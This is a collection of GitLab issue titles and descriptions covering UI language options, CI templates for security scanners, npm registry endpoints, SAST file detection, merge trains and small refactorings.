title: Remove unused language choices
description:
## Problem

There are several languages currently available in GitLab as a user preference, but their translation levels are between 0% and 2%. This kind of a "false" choice creates a disappointing experience for the user, as there is pretty much no change in the UI once it is selected.

## Solution

We will remove these choices from the UI until they reach at least 10% translated strings.

### TODO

- https://gitlab.com/gitlab-org/gitlab/-/merge_requests/38312
  - [x] Make [the list](#the-list) of languages not available in the UI
  - [x] Update the [documentation](https://docs.gitlab.com/ee/development/i18n/externalization.html#adding-a-new-language) with the information that languages with less than 2% of translations won't be available in the UI.

### The List

These languages have 2% translation levels or less and are currently available in the UI (the numbers in the parenthesis are the current number of users with this selection and that number represented as a % of the total number of users):
* Filipino (2 - 0.00%)
* Polish (1,435 - 0.03%)
* Dutch (472 - 0.01%)
* Indonesian (930 - 0.02%)
* Czech (378 - 0.01%)
* Bulgarian (37 - 0.00%)
* Esperanto (25 - 0.00%)
* Galician (27 - 0.00%)

title: Automatically run go mod tidy in Go-based secure projects
description:
## Summary

When working on Go projects, sometimes a new dependency is added to `go.mod` during the development process and not removed when code is committed. See [here](https://gitlab.com/gitlab-org/security-products/analyzers/klar/-/merge_requests/46/diffs?commit_id=08269d44a5cc3534adbb2cffd7dda83c081a5cc5) and [here](https://gitlab.com/gitlab-org/security-products/analyzers/common/-/merge_requests/96/diffs#note_359250404) for examples.

## Improvements

1. Add a new job to [analyzer.yml](https://gitlab.com/gitlab-org/security-products/ci-templates/-/blob/0934e9317cfcec52e2ed7cf9e5f750fd2988f3b4/includes-dev/analyzer.yml#L76-80) in the [ci-templates](https://gitlab.com/gitlab-org/security-products/ci-templates) project:

   ```yaml
   go mod tidy:
     extends: .go
     script:
       - go mod tidy
       - git diff --exit-code go.mod go.sum
   ```

1. Add a new job to other secure projects that don't use `analyzer.yml`, such as the [common package](https://gitlab.com/gitlab-org/security-products/analyzers/common/)

## Involved components

- [ci-templates project](https://gitlab.com/gitlab-org/security-products/ci-templates)
- [common package](https://gitlab.com/gitlab-org/security-products/analyzers/common)

## Intended side effects

Prevents unnecessary dependencies from being added to the `go.mod` file.

title: CI Lint error when Dependency Scanning template included but no test stage
description:
### Summary

When including the ~"Category:Dependency Scanning" template in a CI config that defines the pipeline [`stages`](https://docs.gitlab.com/ee/ci/yaml/#stages) but don't have a `test` stage, GitLab fails to create a pipeline, and reports a CI Lint error instead.

Workarounds:
- Add the `test` stage to the `stages` defined in the CI config
- Override the job definitions of the Dependency Scanning jobs, and for the `stage` to use one of the `stages` defined in the CI config

This also affects ~"Category:SAST", ~"Category:Secret Detection", and ~"Category:Container Scanning".

### Steps to reproduce

Create a GitLab project with a CI configuration file that includes the Dependency Scanning template and forces the `stages` so that `test` is not listed.

```yaml
stages:
  - build

include:
  - template: Dependency-Scanning.gitlab-ci.yml
```

### Example Project

https://gitlab.com/gitlab-org/security-products/tests/ruby-bundler/-/pipelines/168533261

### What is the current *bug* behavior?

CI Lint error for the pipeline.

### What is the expected *correct* behavior?

The pipeline is created, and the Dependency Scanning jobs are executed.

### Relevant logs and/or screenshots

> Found errors in your .gitlab-ci.yml:
> - dependency_scanning job: chosen stage does not exist; available > - stages are .prebuild
> - .post
> You can also test your .gitlab-ci.yml in CI Lint

### Possible fixes

There's no fix but the documentation could be improved. It should tell Dependency Scanning requires a `test` stage by default, and explain how Dependency Scanning jobs can be overridden to use a different stage. Same applies to SAST, Secret Detection, and Container Scanning.

title: Decrease line height of group name in list view
description:
<!---
Please read this!

Before opening a new issue, make sure to search for keywords in the issues
filtered by the "regression" or "bug" label:

- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression
- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=bug

and verify the issue you're about to submit isn't a duplicate.
--->

### Summary

The line height of the group names in list view looks off. Currently it is explicitly set to `42px` when it probably should just be the default `1.5` (`21px`)

### Steps to reproduce

1. Visit `/admin/groups` or `/users/<username>/groups`
2. Resize the browser so the group name wraps

### What is the current *bug* behavior?

Group name line height is too big

### What is the expected *correct* behavior?

Remove explicit line-height so it falls back to default `1.5` (`21px`)

### Relevant logs and/or screenshots

| `/admin/groups` | `/users/<username>/groups` |
| ------ | ------ |
| ![Screen_Shot_2020-06-09_at_2.12.55_PM](/uploads/3bf26d35723cfb01c0ad7d78a9705482/Screen_Shot_2020-06-09_at_2.12.55_PM.png) | ![Screen_Shot_2020-06-09_at_2.14.03_PM](/uploads/810f0f05777c3142501fb0f9a1a49053/Screen_Shot_2020-06-09_at_2.14.03_PM.png) |

### Possible fixes

The style is coming from [app/assets/stylesheets/framework/lists.scss#L123](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/stylesheets/framework/lists.scss#L123)

Ideally it would be removed from here, but this could effect a few other templates so we need to be carful. Other templates that use `.no-description`:

- [ ] [app/views/admin/projects/_projects.html.haml](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/views/admin/projects/_projects.html.haml)
- [ ] [app/views/groups/projects.html.haml](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/views/groups/projects.html.haml)
- [ ] [app/views/shared/projects/_project.html.haml](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/views/shared/projects/_project.html.haml)
- [x] app/views/shared/groups/_group.html.haml !94462
- [ ] app/views/admin/groups/_group.html.haml

title: Allow federation of Atlassian users
description:
## Problem to solve

_**(This work is an iteration on the work done in https://gitlab.com/gitlab-org/gitlab/-/issues/220872 . Review that issue for additional background.)**_

Now that we have a list of issues, we need to be able to expand the functionality by displaying more data, and allowing our user to interact with it (e.g. comment, change status, etc.)

However, currently we only store a single set of credentials in the Jira integration, which is also typically an admin user. This means that, without individual user credentials, all actions would be taken as the same admin user. Additionally, it may be possible for individual users to view content that is beyond their permissions in Jira, which presents potential security problems.

## Intended users

The persona this targets is a version of [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer), but one whose company has invested in the Atlassian suite. Their work is being tracked by other personas (PdMs, PjMs, Designers, etc) in Jira, but they wish to work in GitLab full-time.

_**Note:** future iterations may expand beyond this persona, but this MVC is tightly focused on serving this particular usecase._

## User experience goal

**The user should be able to federate their Jira account, allowing them to connect that account with their GitLab profile.**

Which consists of the following user stories:

- As a developer, I want to be able to federate my Jira account with my GitLab profile, so I can see Jira content.
- As a developer who has federated, I want to be able to revoke this federation for security reasons.

## Proposal

To achieve this goal, we'll extend the [integration with Jira](https://docs.gitlab.com/ee/user/project/integrations/jira.html) to address these specific user stories. We'll add:

1. A section to the [/profile](/profile) page that allows a user to add other accounts.
1. Add a `Connect your Atlassian Account` button to that page that 

We'll add a detail view that displays the full content of a single issue (allowing you to filter them and search), and from that view, a user can click on an individual issue to see the details of it -- just like they would normally.


### Availability & Testing


**What risks does this change pose to our availability?**

This is low risk feature for GitLab.com availability.

**How might it affect the quality of the product?**

This feature will not affect existing product quality.

**What additional test coverage or changes to tests will be needed?**

Unit tests for model and controllers and feature tests for OAuth signin using mocks. 

Ensure following scenarios are covered:

<!-- 
* When signup is enabled, and an account with user's email does not exist in GitLab, a new account is created and tokens are saved to the db.
* When signup is enabled, and an account with user's email already exist in GitLab, a new account is not created and error is shown saying that an account with the email already exists.
* When signup is disabled, no option for the user to sign in with Atlassian shown. 
-->

* When no existing Atlassian identities present, the user sees "Connect your Atlassian Account" button. When they connect their Atlassian account, new identities are created and `refresh_token` (`token`?) is added to the database.

* When existing Atlassian identities are present, the user sees that their account has already been connected and they don't see the "Connect your Atlassian Account" button.

* When existing Atlassian identities are present, the user is able to unlink/remove the connected Atlassian account, which also removes the Atlassian identities and tokens from the db. User is then able to reconnect their account.  

* When the user is unable to connect their Atlassian account due to bad credentials, appropriate message is shown to the user when (if) redirected back to GitLab. No identities or tokens are created in the db in this case.


No end-to-end tests would be added since the integration involves Atlassian Cloud and we avoid e2e test that would involving live 3rd party services.

**Will it require cross-browser testing?**

This should not be necessary since the feature is not heavy on the UI. 

<!-- This section needs to be retained and filled in during the workflow planning breakdown phase of this feature proposal, if not earlier.



Please list the test areas (unit, integration and end-to-end) that needs to be added or updated to ensure that this feature will work as intended. Please use the list below as guidance.
* Unit test changes
* Integration test changes
* End-to-end test change

See the test engineering planning process and reach out to your counterpart Software Engineer in Test for assistance: https://about.gitlab.com/handbook/engineering/quality/test-engineering/#test-planning -->

title: Vulnerabilities in the Pipeline Security tab all link to the same issue
description:
<!---
Please read this!

Before opening a new issue, make sure to search for keywords in the issues
filtered by the "regression" or "bug" label:

- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression
- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=bug

and verify the issue you're about to submit isn't a duplicate.
--->

### Summary

Vulnerabilities reported in the [Pipeline Security tab](https://docs.gitlab.com/ee/user/application_security/security_dashboard/#pipeline-security) all point to the same related issue. 

### Steps to reproduce

(How one can reproduce the issue - this is very important)
- Go to https://gitlab.com/gitlab-org/gitlab/-/pipelines/154539972/security

### Example Project

- https://gitlab.com/gitlab-org/gitlab/-/pipelines/154539972/security
- https://staging.gitlab.com/secure-team-test/js-yarn/-/pipelines/12783179/security

### What is the current *bug* behavior?

All vulnerabilities (which are findings actually, as we don't use First-Class Vulnerabilities in this view yet) have the same related issue. 
As all of them have an issue attached, it's even impossible to create a new one for a vulnerability.

Note that if you use the pagination to view any results on another page, the issue links no longer appear. 

### What is the expected *correct* behavior?

Vulnerabilities have their own issue (if created). 

### Relevant logs and/or screenshots

(Paste any relevant logs - please use code blocks (```) to format console output,
logs, and code as it's tough to read otherwise.)

![gitlab](/uploads/56b1318dd9371a1911a6c27b6704478a/gitlab.gif)

### Possible fixes

To fix this issue it is needed to investigate why feedback is duplicated when  `Gitlab::Vulnerabilities::FindingsPreloader` (https://gitlab.com/gitlab-org/gitlab/blob/master/ee/lib/api/vulnerability_findings.rb#L75) is used. When you are turning commenting out this line everything is working as expected.

/cc @matt_wilson @lkerr @thiagocsf for prioritization.

title: Make the npm project-level endpoint work with all npm commands
description:
### Problem to solve

GitLab's package API is structure slightly differently than NPM's API, and this causes issues when using the `npm` command-line tool to publish NPM packages to [GitLab's NPM registry](https://docs.gitlab.com/ee/user/packages/npm_registry/index.html).

In [our NPM registry docs](https://docs.gitlab.com/ee/user/packages/npm_registry/#authenticating-with-a-ci-job-token), we recommend setting up a `.npmrc` with a `registry` entry like this:

```
@nfriend:registry=https://gitlab.com/api/v4/packages/npm/
```

This allows some `npm` commands to work, for example [`npm view`](https://docs.npmjs.com/cli-commands/view.html):

```bash
❯ npm view @nfriend/npm-test-project version
1.0.2
```

However, this does **not** allow commands like `npm publish` to work:

```bash
❯ npm publish
npm notice
npm notice 📦  @nfriend/npm-test-project@1.0.2
npm notice === Tarball Contents ===
npm notice 137B  index.js
npm notice 273B  package.json
npm notice 40B   README.md
npm notice 1.2kB .gitlab-ci.yml
npm notice === Tarball Details ===
npm notice name:          @nfriend/npm-test-project
npm notice version:       1.0.2
npm notice package size:  955 B
npm notice unpacked size: 1.7 kB
npm notice shasum:        359557fb53f1f29f696b329d05d8244fd94b7c29
npm notice integrity:     sha512-fEns1JvpptkWl[...]ypIIp11jAXDCg==
npm notice total files:   4
npm notice
npm ERR! code E404
npm ERR! 404 Not Found - PUT https://gitlab.com/api/v4/packages/npm/@nfriend%2fnpm-test-project - 404 Not Found
npm ERR! 404
npm ERR! 404  '@nfriend/npm-test-project@1.0.2' is not in the npm registry.
npm ERR! 404 You should bug the author to publish it (or use the name yourself!)
npm ERR! 404
npm ERR! 404 Note that you can also install from a
npm ERR! 404 tarball, folder, http url, or git url.

npm ERR! A complete log of this run can be found in:
npm ERR!     /Users/nathanfriend/.npm/_logs/2020-06-09T19_06_43_137Z-debug.log
```

Notice in the logs above that `npm` is attempting to make a PUT request to `https://gitlab.com/api/v4/packages/npm/@nfriend%2fnpm-test-project`, which isn't supported by GitLab - it expects packages to be published to a project specific endpoint: `https://gitlab.com/api/v4/projects/18806182/packages/npm/@nfriend%2fnpm-test-project`.

In order to get `publish` to work, the `registry` setting in `.npmrc` can be updated to point to the project-specific endpoint:

```
@nfriend:registry=https://gitlab.com/api/v4/projects/18806182/packages/npm/
```

With this config, `npm publish` succeeds:

```bash
❯ npm publish
npm notice
npm notice 📦  @nfriend/npm-test-project@1.0.3
npm notice === Tarball Contents ===
npm notice 137B  index.js
npm notice 273B  package.json
npm notice 40B   README.md
npm notice 1.2kB .gitlab-ci.yml
npm notice === Tarball Details ===
npm notice name:          @nfriend/npm-test-project
npm notice version:       1.0.3
npm notice package size:  955 B
npm notice unpacked size: 1.7 kB
npm notice shasum:        3a29ceaa6960ef1b2c326df6ac41eabd98288718
npm notice integrity:     sha512-IDFoxBcQawjBz[...]nKS+Euc+znDdg==
npm notice total files:   4
npm notice
+ @nfriend/npm-test-project@1.0.3
```

... but `npm view` fails:

```bash
❯ npm view @nfriend/npm-test-project version
npm ERR! code E404
npm ERR! 404 '@nfriend/npm-test-project' is not in the npm registry.
npm ERR! 404 You should bug the author to publish it
npm ERR! 404 (or use the name yourself!)
npm ERR! 404
npm ERR! 404 Note that you can also install from a
npm ERR! 404 tarball, folder, http url, or git url.
npm ERR! 404
npm ERR! 404  '@nfriend/npm-test-project@latest' is not in the npm registry.
npm ERR! 404 You should bug the author to publish it (or use the name yourself!)
npm ERR! 404
npm ERR! 404 Note that you can also install from a
npm ERR! 404 tarball, folder, http url, or git url.

npm ERR! A complete log of this run can be found in:
npm ERR!     /Users/nathanfriend/.npm/_logs/2020-06-09T19_10_49_642Z-debug.log
```

#### What's the workaround?

We work around this by [asking users to specify a `publishConfig` in their `package.json`](https://docs.gitlab.com/ee/user/packages/npm_registry/#uploading-packages):

> Before you will be able to upload a package, you need to specify the registry for NPM. To do this, add the following section to the bottom of `package.json`:
> 
> ```json
> "publishConfig": {
>   "@foo:registry":"https://gitlab.com/api/v4/projects/<your_project_id>/packages/npm/"
> }
> ```

Note the **https** as this won't work with **http** (added this after ZD [Ticket](https://gitlab.zendesk.com/agent/tickets/172884) (Internal)

This allows the `npm` command-line tool to use the "generic" endpoint (i.e. `https://gitlab.com/api/v4/packages/npm/`) for all commands except `publish`, which will instead use the endpoint specified in `publishConfig`.

This is an okay workaround, but it has a few downsides:

- It adds extra friction to getting set up to publish packages to GitLab's NPM registry
- It makes it harder to automate. For example, environment variables can be replaced inside a `.npmrc` ([which we recommend doing in our docs](https://docs.gitlab.com/ee/user/packages/npm_registry/#using-variables-to-avoid-hard-coding-auth-token-values)), but this isn't possible in `package.json`. Because of this, users have to hard-code the GitLab project ID into `package.json`.
- It doesn't match the expectations developers bring from using NPM's official registry

### Intended users

Anyone who interacts with GitLab's NPM package registry. (Particularly when setting up automation).

### User experience goal

Users of [GitLab's NPM registry](https://docs.gitlab.com/ee/user/packages/npm_registry/index.html) should be able to use `npm` (the command-line tool) exactly the same way as they do when interacting with packages on https://www.npmjs.com/.

### Proposal

Standardize on using `https://gitlab.com/api/v4/projects/<project ID>/packages/npm/` as the one and only NPM registry endpoint. This would allow users to configure their `.npmrc` like this:

```
@nfriend:registry=https://gitlab.com/api/v4/projects/18806182/packages/npm/
```

and perform all `npm` commands (`publish`, `view`, etc.) without needing to edit `package.json`.

### Further details

I'm not sure if this is a ~bug or a ~feature request, but I think I'll categorize this as a ~feature since [the current behavior is well documented](https://docs.gitlab.com/ee/user/packages/npm_registry/#authenticating-with-a-ci-job-token).

### Documentation

If implemented, this would allow us to remove some setup steps from our documentation, in particular: https://docs.gitlab.com/ee/user/packages/npm_registry/#uploading-packages.

epic.title: Make the Package Registry easier to use with CI

title: SAST file detection should not be case sensitive
description:
### Summary Case-insensitive servers or operating systems (such as Microsoft Windows) normally allow file extensions to contain capital letters. If a project contains such files (e.g. `test.PHP`), they will not be scanned, since they do not match the expected extension, which must consist of lowercase strings, which would reduce the effectiveness of the SAST scan. ### Steps to reproduce To reproduce the issue, add a file containing vulnerabilities to a new or existing project, and make sure that its extension contains one or more capital letters, such as `.PHP`. The following projects contain exactly the same files and configuration, with the only difference of the uppercase extension in "TestPHP2". #### Project definitions ![image](/uploads/59af803bdb85c4c02c5390d0fb5495cb/image.png) #### Results ![image](/uploads/808909f0b4e06ceaf3c2c2874ed84410/image.png) ### Example Project (If possible, please create an example project here on GitLab.com that exhibits the problematic behavior, and link to it here in the bug report) (If you are using an older version of GitLab, this will also determine whether the bug is fixed in a more recent version) ### What is the current *bug* behavior? Files with extensions containing capital letters do not get detected and scanned. ### What is the expected *correct* behavior? Files with extensions containing capital letters are detected and scanned. ### Relevant logs and/or screenshots (Paste any relevant logs - please use code blocks (```) to format console output, logs, and code as it's tough to read otherwise.) ### Output of checks (If you are reporting a bug on GitLab.com, write: This bug happens on GitLab.com) #### Results of GitLab environment info
Expand for output related to GitLab environment info 

(For installations with omnibus-gitlab package run and paste the output of:
`sudo gitlab-rake gitlab:env:info`)

(For installations from source run and paste the output of:
`sudo -u git -H bundle exec rake gitlab:env:info RAILS_ENV=production`)
#### Results of GitLab application Check
Expand for output related to the GitLab application check 

(For installations with omnibus-gitlab package run and paste the output of:
`sudo gitlab-rake gitlab:check SANITIZE=true`)

(For installations from source run and paste the output of:
`sudo -u git -H bundle exec rake gitlab:check RAILS_ENV=production SANITIZE=true`)

(we will only investigate if the tests are passing)
### Possible fixes There are two potential spots where this behavior needs to be addressed. * [SAST vendored template](https://gitlab.com/gitlab-org/gitlab/blob/master/lib/gitlab/ci/templates/Security/SAST.gitlab-ci.yml) * [SAST analyzer](https://gitlab.com/explore/projects?tag=SAST) match logic ### Implementation Plan 1. Update `SAST.gitlab-ci.yml` `rules.exists` conditions to including globs for all case variations (`**/*.rb` => `**/*.{rb,RB,rB,Rb}`) 1. Update `Dependency-Scanning.gitlab-ci.yml` `rules.exists` conditions to including globs for all case variations (`**/*.rb` => `**/*.{rb,RB,rB,Rb}`)

title: DAST: Implement Usage Ping for On-demand scans
description:
### User story

As a Secure PM, I want to see data on how much the On-demand scans are being utilized on self-managed GitLab instances, so that I know that the feature is being used.

### Description

We need to implement Usage Ping for the self-managed instances, so that we know how much the On-demand DAST scans are being utilized by our non-.com customers. The data that I'd like to track is the number of on-demand scans that are run.

title: Configure Secure QA CI Templates to use rules syntax
description:
<!-- The first four sections: "Problem to solve", "Intended users", "User experience goal", and "Proposal", are strongly recommended, while the rest of the sections can be filled out during the problem validation or breakdown phase. However, keep in mind that providing complete and relevant information early helps our product team validate the problem and start working on a solution. -->

### Problem to solve

Our [Secure QA CI templates](https://gitlab.com/gitlab-org/security-products/ci-templates/) are a mixture of configurations used for the release, testing, and QA of our security products. These all use the deprecated `only/except` syntax and should be updated to use [`rules`](https://docs.gitlab.com/ee/ci/yaml/#rules) instead.

### Intended users

* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)
* [Rachel (Release Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#rachel-release-manager) 

### User experience goal

Better release process with modern tools and syntax

### Proposal

- [ ] Update all QA templates to use new `rules` syntax
  - [ ] Update [`qa-container_scanning`](https://gitlab.com/gitlab-org/security-products/ci-templates/blob/master/includes-dev/qa-container_scanning.yml)
  - [ ] Update [`qa-dependency_scanning`](https://gitlab.com/gitlab-org/security-products/ci-templates/blob/master/includes-dev/qa-dependency_scanning.yml)
    - [ ] Update `no_dind-FREEZE` branch `only` syntax for `java-gradle/.gitlab-ci.yml`
    - [ ] Update `no_dind-FREEZE` branch `only` syntax for `java-maven/.gitlab-ci.yml`
    - [ ] Update `no_dind-FREEZE` branch `only` syntax for `java-gradle-kotlin-dsl/.gitlab-ci.yml`
    - [ ] Update `no_dind-FREEZE` branch `only` syntax for `go-modules/.gitlab-ci.yml`
    - [ ] Update `no_dind-FREEZE` branch `only` syntax for `ruby-bundler/.gitlab-ci.yml`
    - [ ] Update `no_dind-FREEZE` branch `only` syntax for `js-yarn/.gitlab-ci.yml`
    - [ ] Update `no_dind-FREEZE` branch `only` syntax for `php-composer/.gitlab-ci.yml`
    - [ ] Update `no_dind-FREEZE` branch `only` syntax for `python-pipenv/.gitlab-ci.yml`
    - [ ] Update `no_dind-FREEZE` branch `only` syntax for `java-gradle-multimodules/.gitlab-ci.yml`
    - [ ] Update `no_dind-FREEZE` branch `only` syntax for `python-pip/.gitlab-ci.yml`
    - [ ] Update `no_dind-FREEZE` branch `only` syntax for `js-npm/.gitlab-ci.yml`
    - [ ] Update `no_dind-FREEZE` branch `only` syntax for `scala-sbt/.gitlab-ci.yml`
  - [ ] Update [`qa-sast`](https://gitlab.com/gitlab-org/security-products/ci-templates/blob/master/includes-dev/qa-sast.yml)
  - [ ] Update [`qa-license_scanning`](https://gitlab.com/gitlab-org/security-products/ci-templates/blob/master/includes-dev/qa-license_scanning.yml)
  - [ ] Update [`qa-secret_detection`](https://gitlab.com/gitlab-org/security-products/ci-templates/blob/master/includes-dev/qa-secret_detection.yml)

### Further details

First attempt at this was https://gitlab.com/gitlab-org/security-products/ci-templates/-/merge_requests/117.

This was reverted in https://gitlab.com/gitlab-org/security-products/ci-templates/-/merge_requests/119 due to recursive MR creations.

Second attempt was made with https://gitlab.com/gitlab-org/security-products/ci-templates/-/merge_requests/122, but once the issue was identified (see NOTE below) the scope of the work was significant enough to warrant its own issue.

*NOTE:* See https://gitlab.com/gitlab-org/security-products/ci-templates/-/merge_requests/122#note_357593588 for issue with first and second MRs, but in summary: all test projects `extend` the base `.update-qa-**` jobs prefixed with the dot notation so we need those to contain the given rules, not the `update-qa-**` child jobs.

### Permissions and Security

No change to permissions

### Documentation

No change to documentation

### Availability & Testing

<!-- This section needs to be retained and filled in during the workflow planning breakdown phase of this feature proposal, if not earlier.

~"GitLab Ultimate"

title: Properly display the error message upon container expiration policy validation
description:
## Summary

Follow up of https://gitlab.com/gitlab-org/gitlab/-/merge_requests/34063#note_357968187

With https://gitlab.com/gitlab-org/gitlab/-/merge_requests/34063, regex used within container expiration policies are now validated.

If a user submits an invalid regex, an alert toast will be displayed with `Something went wrong while updating` (see examples https://gitlab.com/gitlab-org/gitlab/-/merge_requests/34063#screenshots).

This is quite vague. The rest API actually answers a very precise error. Example for regex `[`:

```json
{
  "message": {
    "container_expiration_policy.name_regex_keep": [
      "not valid RE2 syntax: missing ]: ["
    ]
  }
}
```

The ~frontend can infer which field is wrong and why.

## Improvements

* Have a better and more precise error message

## Risks

* The error message is not displayed at all

## Optional: Intended side effects

* Remove the `Troubleshooting` section added by https://gitlab.com/gitlab-org/gitlab/-/merge_requests/34063

title: Merge request on a merge train should not be dropped due to new comment/thread
description:
## Problem to solve

Merge request is dropped from merge train when another user opens a new thread in the MR.

Problematic scenario:
1. A merge request author (@MRauthor) adds a merge request to the merge train
2. While the merge request is part of the merge train, another user (@Commenter) opens a new thread
3. The merge request is dropped from the merge train with a system note added to the merge train: "@MRauthor removed this merge request from the merge train because merge request is not mergeable 7 minutes ago"

Illustration of above scenario in the activities of a merge request:

![image](/uploads/a7d4efb51ea17b46e0d59ad4696eb558/image.png)

## Intended users

* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)
* [Devon (DevOps Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#devon-devops-engineer)

## User experience goal

A new comment/thread should not result in interrupting the process once an MR has been added to merge train. 

## Proposal

A new thread or comment that un-resolves a thread should not drop the MR from the merge train.

## Further details

Currently commenter does not have the power to remove the merge request from the merge train via the UI.

| What @commenter sees | What @MRauthor sees |
| ------ | ------ |
| ![image](/uploads/136662ea6d4b0691814a6c4077506fbc/image.png) | ![image](/uploads/f84446b64be8d237481e842fa67348ca/image.png) |

title: Imports are failing on the import-export-performance pipeline
description:
The performance tests for imports that we're running as part of https://gitlab.com/gitlab-org/memory-team/import-export-performance/ have been failing since June 4 2020.

It is unclear what the issue is and needs to be triaged first, but some observations:

- A single relation is reported to have failed to be imported due to a stale FK relationship: `PG::ForeignKeyViolation: ERROR:  insert or update on table \"issue_user_mentions\" violates foreign key constraint \"fk_rails_3861d9fefa\"\n" +
    "DETAIL:  Key (note_id)=(49466884) is not present in table \"notes\"` (see e.g. https://gitlab.com/gitlab-org/memory-team/import-export-performance/-/jobs/584976195)
- However, this should not actually fail the entire job, because we recover from individual relation failures and just collect them in the `import_failures` table

So we should verify as well if it's really this one relation that's failing the entire job when it shouldn't, or if that just happened coincidentally (can't hurt to get to the bottom why it failed to import too.) Generally individual relations failing to import are considered "soft failures" and should not fail the entire project import.

title: Fire Webhook on Feature Flag change
description:

- [push-based communication for Feature Flag proxy](https://gitlab.com/gitlab-org/gitlab/-/issues/35132#note_356464721)
- [Cache invalidation for flipper clients.](https://gitlab.com/gitlab-org/gitlab/-/issues/26842#cache-invalidation)
- Sending a slack notification when someone changed a flag.

title: Update MR approval settings to use new design
description:
### Problem to solve

The current MR approval settings do not follow our Pajama's design principles and could be visually better.

### Intended users

* [Cameron (Compliance Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#cameron-compliance-manager)
* [Sidney (Systems Administrator)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sidney-systems-administrator)

### User experience goal

The user should see an improved visual experience which meets our Pajama's design principles and easy to understand and use.

### Proposal

We should change the MR Approval settings in `Admin > Push Rules` to use Pajama's as per the designs below. The UI changes should be shown both for when the compliance orientated MR approval settings are shown and when the normal MR approval settings are shown (one restricts by compliance framework and one does not).

### Further details

#### Designs

[Figma prototype](https://www.figma.com/file/CnUPDuQIWz8z2F4DVrjcfj/213601-Allow-admins-to-scope-MR-approval-settings?node-id=4%3A368)

![image](/uploads/936523e9327ebf6c2eced615bd333fed/image.png)

#### Implementation details

1) Create a new Vue app to be able to use [GitLab UI](https://gitlab-org.gitlab.io/gitlab-ui/?path=/story/base-toggle--default) components
2) Implement the new UI in the Vue app and trigger the necessary form submissions
3) Add tests

### Availability & Testing

* Unit tests will need to be created for the Vue app
* Unit tests may need to be updated or deleted from the HAML side
* Integration and QA tests may need to be updated to match the new UI

title: Suggest to run RUN AS-IF-FOSS when too many test files detected in rspec foss-impact
description:
Refactoring and chore MRs (such as Rubocop changes, Rails upgrade, linting, etc), may touch a large number of files, but do not change EE & FOSS structure. In this case, the `rspec foss-impact` could time out due to large number of test files to run.

Examples of such MRs:
- !33740 (600 test files changed and `rspec foss-impact` timed out after 120 minutes)

New solution based on [discussion](https://gitlab.com/gitlab-org/gitlab/-/issues/220883#note_358212745):
* Do not `foss impact` when the title includes `RUN AS-IF-FOSS` (or more generally speaking, don't run it when we're running FOSS tests)
* `foss impact` should fail directly without running any tests when there are more than `N` files detected and ask the author to update the merge request title to contain `RUN AS-IF-FOSS` so that we can just utilize the existing FOSS tests better. It's probably also a good chance to tell people that how they can run FOSS tests.
* Set N to 20 test files detected

title: Configure License Compliance for Security Products
description:
<!-- The first four sections: "Problem to solve", "Intended users", "User experience goal", and "Proposal", are strongly recommended, while the rest of the sections can be filled out during the problem validation or breakdown phase. However, keep in mind that providing complete and relevant information early helps our product team validate the problem and start working on a solution. -->

### Problem to solve

Security Product projects don't have automated ways to check which licenses are allowed or denied.

### Intended users

~"devops::secure" team members


### Proposal

Configure all relevant [Secure projects](https://gitlab.com/gitlab-org/security-products) with License Policies matching our [Acceptable Licenses](https://about.gitlab.com/handbook/engineering/open-source/#acceptable-licenses) and [Unacceptable Licenses](https://about.gitlab.com/handbook/engineering/open-source/#unacceptable-licenses).

We might be able to use [the managed licenses API](https://docs.gitlab.com/ee/api/managed_licenses.html) to script this instead of doing it manually via the UI

#### Implementation plan

1. Go through [Secure projects](https://gitlab.com/gitlab-org/security-products) and find those that contain package manager files. Exclude demo and test projects because they don't have originally written code.
1. Create a script using [the managed licenses API](https://docs.gitlab.com/ee/api/managed_licenses.html) to apply [allowed]((https://about.gitlab.com/handbook/engineering/open-source/#acceptable-licenses)) and [denied](https://about.gitlab.com/handbook/engineering/open-source/#unacceptable-licenses) licenses.
1. Apply this script to found projects.

### Further details

<!-- Include use cases, benefits, goals, or any other details that will help us understand the problem better. -->

### Permissions and Security

There is no change in permissions, but DRI should have `Maintainer` permissions for Secure projects to update policies.

### What does success look like, and how can we measure that?

When introducing a new dependency, the license must be checked against the configured policies to prevent denied licenses to be included.

### Is this a cross-stage feature?

This impacts all groups of ~"devops::secure" 

### Links / references

title: Hide Health Status when Issue or Epic is Closed

title: Follow up on 'Preserve order when applying multiple scoped labels'
description:
## Summary

From https://gitlab.com/gitlab-org/gitlab/-/merge_requests/33420#note_357141343

[EE::IssuableBaseService#filter_labels](https://gitlab.com/gitlab-org/gitlab/-/blob/4d9c8046592f8c73508eeed890f51d907c9aa143/ee/app/services/ee/issuable_base_service.rb#L28) should be refactored to move everything into one iteration.

```ruby
label_keys = %i(add_labels labels)
label_keys.each do |attr|
  params[attr] = params[attr].split(',') if params[attr].is_a?(String)
end

@label_ids_ordered_by_attribute = if label_keys.any? { |k| params.has_key?(k) } # rubocop:disable Gitlab/ModuleWithInstanceVariables
                                    [:title, params[:add_labels].to_a + params[:labels].to_a]
                                  else
                                    [:id, params[:add_label_ids].to_a + params[:label_ids].to_a]
                                  end

super
```

to

```ruby
if label_keys.any? { |k| params.has_key?(k) }
     label_keys.each do |attr|
       params[attr] = params[attr].split(',') if params[attr].is_a?(String)
     end
    @label_ids_ordered_by_attribute = [:title, params[:add_labels].to_a + params[:labels].to_a]  # rubocop:disable Gitlab/ModuleWithInstanceVariables
else
    @label_ids_ordered_by_attribute = [:id, params[:add_label_ids].to_a + params[:label_ids].to_a]  # rubocop:disable Gitlab/ModuleWithInstanceVariables
end

super
```

title: Implement "Token Selector" component for group "Restrict access by IP address" field

